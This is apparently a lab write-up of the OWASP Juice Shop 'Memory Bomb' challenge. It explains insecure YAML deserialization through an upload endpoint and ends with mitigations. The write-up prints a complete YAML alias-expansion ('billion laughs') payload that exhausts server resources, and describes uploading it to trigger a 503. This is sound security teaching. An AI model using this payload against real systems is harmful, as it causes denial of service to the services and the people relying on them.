# Memory Bomb

## Challenge Information

| Field         | Details                  |
| ------------- | ------------------------ |
| Challenge     | Memory Bomb              |
| Category      | Insecure Deserialization |
| Difficulty    | 5                        |
| Tags          | Danger Zone              |
| Challenge Key | `yamlBombChallenge`      |
| Endpoint      | `POST /file-upload`      |
| File Format   | YAML (`.yml` / `.yaml`)  |

## Objective

Exploit a vulnerable YAML file-handling endpoint by submitting a specially crafted YAML document that causes excessive resource consumption during deserialization.

The objective is to keep the server busy for more than two seconds, triggering the application's timeout handling and solving the challenge.

## Reconnaissance

The challenge metadata identifies **Memory Bomb** as an **Insecure Deserialization** challenge.

The provided hints indicate that the vulnerability is similar to the XXE DoS challenge, except that YAML is the data format being abused.

The challenge also notes that the effectiveness of the payload can depend on the operating system running Juice Shop.

### Challenge Metadata

![Memory Bomb challenge metadata](../../../images/04-memory-bomb-challenge-metadata.png)

## Attack Surface Discovery

The vulnerable functionality is exposed through the file upload endpoint:

```http
POST /file-upload
```

The endpoint accepts a multipart form upload using the `file` field.

YAML files are identified by their `.yml` or `.yaml` extension and passed to the YAML processing logic.

### Request Flow

```text
File Complaint
      ↓
POST /file-upload
      ↓
Multipart file upload
      ↓
YAML file detection
      ↓
yaml.load(data)
      ↓
YAML deserialization
      ↓
Resource exhaustion / timeout
```

### Attack Surface Evidence

The request was intercepted and inspected using Burp Suite.

![Memory Bomb attack surface](../../../images/05-memory-bomb-attack-surface.png)

## Insecure Deserialization

The vulnerable server-side functionality processes the uploaded YAML using:

```javascript
yaml.load(data)
```

The parsed YAML data is then converted to JSON inside a VM context.

The important security issue is that YAML supports **anchors and aliases**, which can reference previously defined structures.

When these references are expanded repeatedly, a relatively small YAML document can result in a much larger in-memory data structure.

This makes the parser a potential resource-exhaustion target.

## YAML Alias Expansion

The attack uses a series of YAML anchors and aliases.

The payload starts with a small structure:

```yaml
a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
```

Later objects reference the previous structures repeatedly:

```yaml
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
```

The pattern continues through additional levels.

The complete payload used in the lab was:

```yaml
a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

This is a **YAML resource-exhaustion payload**. It does not provide remote code execution.

## Exploitation

The YAML payload was saved locally as:

```text
yamlBomb.yaml
```

It was then uploaded through the Juice Shop **File Complaint** functionality.

The request was intercepted with Burp Suite before being forwarded to the application.

The server attempted to process the YAML document and exceeded the configured execution limit.

The vulnerable handler catches timeout/resource-related errors and returns:

```http
HTTP/1.1 503 Service Unavailable
```

with the message:

```text
Sorry, we are temporarily not available! Please try again later.
```

## Evidence

The exploitation request resulted in a `503 Service Unavailable` response.

The response stack trace identified the vulnerable processing function:

```text
handleYamlUpload
```

and confirmed that the error occurred while processing the uploaded YAML file.

![Memory Bomb exploitation evidence](../../../images/06-memory-bomb-exploitation-evidence.png)

The Juice Shop Score Board subsequently displayed **Memory Bomb as solved**, confirming successful completion of the challenge.

## Impact

A vulnerable YAML deserialization implementation can allow an attacker to submit specially crafted data that causes excessive memory or CPU consumption.

Potential consequences include:

* Application slowdown
* Excessive memory consumption
* CPU exhaustion
* Request timeouts
* Service unavailability
* Denial of Service

The important distinction is that this attack abuses **resource consumption during YAML processing**, rather than executing arbitrary code.

## Mitigation

Applications should avoid unsafe deserialization of untrusted YAML data.

Recommended protections include:

* Avoid deserializing YAML from untrusted users whenever possible.
* Use safe YAML loading functionality where supported.
* Disable or restrict YAML anchors and aliases when they are not required.
* Apply strict input-size limits.
* Enforce resource and execution limits.
* Monitor CPU and memory consumption during parsing.
* Reject unnecessarily complex or deeply nested YAML structures.
* Keep YAML parsing libraries updated.
* Treat uploaded files as untrusted input.

## Lessons Learned

This challenge demonstrated that insecure deserialization is not limited to code execution.

A serialization format can also become a denial-of-service vector when specially crafted data causes excessive resource consumption during parsing or object construction.

Key takeaways:

* YAML anchors and aliases can create unexpectedly large structures.
* Small input does not necessarily mean small processing cost.
* File upload endpoints should be treated as attack surfaces.
* Deserialization of untrusted data requires strict controls.
* Server-side timeouts can limit the impact of resource-intensive processing.
* Burp Suite can be used to inspect and reproduce file-upload requests.
* A `503` response caused by parser/resource limits can provide evidence of successful resource exhaustion in a controlled lab.

